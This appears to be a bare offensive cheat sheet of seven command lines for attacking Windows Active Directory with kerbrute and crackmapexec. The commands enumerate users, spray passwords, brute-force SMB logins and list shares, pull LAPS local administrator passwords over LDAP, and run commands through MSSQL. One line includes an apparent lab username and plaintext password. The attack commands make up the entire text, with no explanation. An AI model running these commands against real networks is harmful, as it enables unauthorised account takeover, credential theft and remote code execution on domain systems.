./kerbrute_linux_amd64 passwordspray -d <DOMAIN> domain_users.txt <PASSWORD>
kerbrute userenum -d <DOMAIN> usernames.txt
kerbrute -domain <DOMAIN> -users users.txt -dc-ip <IP>
crackmapexec smb <IP> -u users -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
crackmapexec smb <IP> -u users.txt -p passwords.txt --shares
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
crackmapexec mssql -d <DOMAIN> -u <username> -p <password> -x "whoami"
